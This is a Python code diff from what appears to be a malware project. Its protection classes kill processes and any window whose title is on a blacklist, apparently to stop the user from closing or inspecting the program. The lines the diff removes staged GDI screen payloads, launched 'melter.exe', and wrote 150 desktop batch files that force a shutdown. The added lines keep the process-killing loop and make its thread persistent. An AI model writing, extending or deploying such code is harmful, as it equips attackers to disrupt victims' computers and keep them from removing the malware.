@@ -4,16 +4,15 @@ import subprocess
 import signal
 import psutil
 import threading
-from .util import GetCurrentWindowTitle
-from .util import getHwnd
-from .util import get_pid_from_window_hwnd
-from .util import list_windows
+from .util import GetActiveWindow as  GetCurrentWindowTitle
+from .util import kill_process_from_window_name
+from .util import GetActiveWindows as list_windows
+from .util import list_proc_pids_from_name
+from .util import kill_procs_from_pids
 from .msgbox import *
 from .localization import strings
 string = strings()
 execute = os.system
-drop_gdi_payload = lambda *args:None
-from Suura.includes.payloads.gdi_payloads import GDI_PAYLOAD_2,GDI_PAYLOAD
 class ProcessProtection:
     def __init__(self):
         self.black_list_process = [
@@ -70,7 +69,6 @@ class ProcessProtection:
                 process_id = process.pid
                 if process_name in self.black_list_process:
                     try:
-                        #subprocess.call(f"taskkill.exe /f /im {process_name}".split(" "))
                         os.kill(process_id,signal.SIGTERM)
                     except OSError:
                         pass
@@ -82,48 +80,28 @@ class ProcessProtection:
 class WindowProtection:
     def __init__(self):
         self.blacklisted_titles = string.string_user_opened_not_allowed_wintitles
-        self.stage = 0
-        self.child_stage = 0
-        self.stage_dropper = {
-            1:{
-                "handler":GDI_PAYLOAD_2(),
-                "is_dropped":False
-            },
-            2:{
-                "handler":GDI_PAYLOAD(),
-                "is_dropped":False
-            }
-        }
-    def melt_it(self):
-        path = os.path.join(os.path.expanduser("~"),"melter.exe")
-        try:
-            subprocess.call(path)
-        except:
-            pass
-    def dont_do_that(self):
-        optional_path = os.path.join(os.path.expanduser("~"),"Desktop")
-        for i in range(1,150):
-            with open(optional_path+"dont_do_that_%s.bat" % (i),"w") as fd:
-                fd.write("shutdown /s /f /t")
-    def kill_proc(self,window_title: str):
-        window_hwnd = list_windows().get(window_title)
-        if not window_hwnd is None:
-            pid = get_pid_from_window_hwnd(window_title,window_hwnd)
-            if pid != 0:
-                try:
-                    os.kill(pid,signal.SIGTERM)
-                    self.stage = self.stage + 1
-                except Exception as kill_err:
-                    return False
+        self._call_back_func = None
+    @property
+    def callback_func(self):
+        return self._call_back_func
+    @callback_func.setter
+    def callback_func(self,func_name):
+        if func_name.__class__.__name__ in ("method","function"): #only allowed methods and functions
+            self._call_back_func = func_name
     def _handler(self):
+        print("I am working god dammit")
         while True:
             for black_listed_window_ in self.blacklisted_titles:
                 window_title = GetCurrentWindowTitle()
                 if black_listed_window_ in window_title.lower():
-                    self.kill_proc(window_title)
-                if not self.stage_dropper.get(self.stage) is None and self.stage_dropper[self.stage]["is_dropped"] is False:
-                    self.stage_dropper[self.stage]["is_dropped"] = True
-                    self.stage_dropper[self.stage]["handler"].start()
+                    if self.callback_func is not None:
+                        try:
+                            self.callback_func()
+                        except:
+                            pass #ignore exceptions and continue
+                    kill_process_from_window_name(window_title)
+            time.sleep(0.1)
+
     def start(self):
-        thread = threading.Thread(target=self._handler,daemon=True)
+        thread = threading.Thread(target=self._handler,daemon=False)
         thread.start()
